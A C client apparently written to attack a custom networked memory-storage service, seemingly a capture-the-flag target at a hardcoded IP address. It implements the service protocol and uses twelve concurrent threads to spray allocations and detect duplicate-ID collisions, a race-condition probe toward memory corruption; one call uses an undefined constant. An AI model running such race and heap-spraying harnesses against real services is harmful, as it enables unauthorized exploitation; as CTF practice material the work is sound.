#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define ABORT(msg) do {puts(msg); exit(-1);} while (0);
#define PACK __attribute__((__packed__))

enum ram_command {
    CMD_RAM_COMPANY_INFO    = 0x0,
    CMD_RAM_ALLOC           = 0x1,
    CMD_RAM_FREE            = 0x2,
    CMD_RAM_READ            = 0x3,
    CMD_RAM_WRITE           = 0x4,
    CMD_RAM_CLEAR           = 0x5,
    CMD_RAM_AVAILABLE       = 0x6,
    CMD_RAM_DEFRAGMENT      = 0x7,
};

enum ram_error {
    ERR_NO_ERROR            = 0x0,
    ERR_INVALID_CMD         = 0xC0000001,
    ERR_INVALID_SIZE        = 0xC0000002,
    ERR_NO_SPACE_LEFT       = 0xC0000003,
    ERR_ENTRY_NOT_FOUND     = 0xC0000004,
    ERR_INVALID_PACKET      = 0xC0000005,
    ERR_MAX_ID              = 0xC0000006,
    ERR_CHECKSUM            = 0xC0000007,
    ERR_INVALID_ENC_SIZE    = 0xC0000008,
};

pthread_mutex_t create_mutex;
pthread_mutex_t remove_mutex;

#define PORT 42588

int init_socket()
{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd == -1) {
        printf("yoyo");
        ABORT("[!] socket creation failure.");
    }

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("51.210.114.238");
    servaddr.sin_port = htons(PORT);

    if (connect(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) != 0)
        ABORT("[!] Failed connect to host.");
    
    printf("[+] Connected (fd: %d).\n", sockfd);

    return sockfd;
}

void send_command(int fd, enum ram_command cmd)
{
    uint32_t packet = 0;
    packet = cmd;
    write(fd, &packet, sizeof(packet)); // MSG_NOSIGNAL
}

char *recv_msg(int fd)
{
    uint32_t msg_size = 0;
    char *msg = NULL;

    read(fd, &msg_size, sizeof(msg_size));

    if ((msg = calloc(1, msg_size + 1)) == NULL)
        ABORT("[!] Failed to allocate.");

    read(fd, msg, msg_size);

    return msg;
}

void cmd_ram_company_info(int fd)
{
    uint32_t res = 0;
    send_command(fd, COMPANY_INFO);
    printf("%s\n", recv_msg(fd));
    printf("%s\n", recv_msg(fd));
    read(fd, &res, sizeof(res));
}

uint32_t get_res_code(int fd)
{
    uint32_t res = 0;
    read(fd, &res, sizeof(res));
    return res;
}

uint32_t cmd_ram_clear(int fd)
{
    send_command(fd, CMD_RAM_CLEAR);
    return get_res_code(fd); 
}

uint32_t cmd_ram_alloc(int fd, uint16_t size, bool is_enc)
{
    struct {
        uint16_t size;
        uint16_t is_enc;
    } packet = {
        .size = size,
        .is_enc = (uint16_t)is_enc,
    };

    uint32_t id = 0;

    send_command(fd, CMD_RAM_ALLOC);

    //pthread_mutex_lock(&create_mutex);
    write(fd, &packet, sizeof(packet));

    if (get_res_code(fd) == ERR_NO_SPACE_LEFT)
        puts("[!] Cannot alloc cell, full storage.");
    
    //pthread_mutex_unlock(&create_mutex);

    read(fd, &id, sizeof(id));
    return id;
}

void cmd_ram_write(int fd, uint32_t id, void *data, uint16_t data_size)
{
    struct {
        uint32_t id;
        uint16_t data_size;
    } packet = {
        .id = id,
        .data_size = data_size,
    };

    send_command(fd, CMD_RAM_WRITE);

    write(fd, &packet, sizeof(packet));
    write(fd, data, data_size);

    if (get_res_code(fd) != 0)
        puts("[!] Failed to store data.");
}

void cmd_ram_write_hang_start(int fd, uint32_t id, uint16_t data_size)
{
    struct {
        uint32_t id;
        uint16_t data_size;
    } packet = {
        .id = id,
        .data_size = data_size,
    };

    send_command(fd, CMD_RAM_WRITE);

    write(fd, &packet, sizeof(packet));
}

void cmd_ram_write_hang_end(int fd, void *data, uint16_t data_size)
{
    write(fd, data, data_size);

    if (get_res_code(fd) != 0)
        puts("[!] Failed to store data.");
}

uint32_t cmd_ram_available(int fd)
{
    uint32_t empty = 0;
    send_command(fd, CMD_RAM_AVAILABLE);
    read(fd, &empty, sizeof(empty));
    return get_res_code(fd);
}

void cmd_ram_defragment(int fd)
{
    uint32_t res = 0;
    send_command(fd, CMD_RAM_DEFRAGMENT);
    res = get_res_code(fd);
}

bool cmd_ram_free(int fd, uint32_t id)
{
    struct {
        uint32_t id;
    } packet = {
        .id = id,
    };
    
    send_command(fd, CMD_RAM_FREE);
    
    pthread_mutex_lock(&remove_mutex);
    write(fd, &packet, sizeof(packet));
    
    if (get_res_code(fd) == ERR_ENTRY_NOT_FOUND)
        puts("missed");
    
    pthread_mutex_unlock(&remove_mutex);

    return true;
}

#define NB_THREADS 12

uint32_t total = 0;
bool create_finished = false;

#define MAX_IDS 0x100

pthread_mutex_t insert_mutex;

uint32_t ids[MAX_IDS];
uint16_t id_cur_idx = 0;

bool start = false;

void *spray_data(void *arg)
{
    int fd;
    uint32_t id;
    uint32_t remain_size;
    
    fd = init_socket();

    uint32_t list_ids[MAX_IDS / NB_THREADS];

    while (!start) {};

    for (uint32_t i = 0; i < (MAX_IDS / NB_THREADS); i++) {
        id = cmd_ram_alloc(fd, 0x80, false);
        list_ids[i] = id;
    }

    pthread_mutex_lock(&insert_mutex);
    for (int i = 0; i < (MAX_IDS / NB_THREADS); i++)
    {
        ids[id_cur_idx] = list_ids[i];
        id_cur_idx++;
    }
    pthread_mutex_unlock(&insert_mutex);
}

int main(int argc, char *argv[])
{
    int fd = init_socket();
    void *res;

    pthread_t log_thread;
    pthread_t threads_ids[NB_THREADS];

    for (int i = 0; i < NB_THREADS; i++)
        pthread_create(&threads_ids[i], NULL, &spray_data, NULL);

    sleep(4);
    start = true;

    for (int i = 0; i < NB_THREADS; i++)
        pthread_join(threads_ids[i], &res);

    for (int i = 0; i < MAX_IDS; i++)
        printf("%d\n", ids[i]);

    for (int i = 0; i < MAX_IDS; i++) {
        uint32_t cur_check_id = ids[i];
        for (int j = 0; j < MAX_IDS; j++) {
            if (cur_check_id != 0 && (i != j) && cur_check_id == ids[j])
                printf("Found collision: %d\n", ids[j]);
        }
    }

    close(fd);
}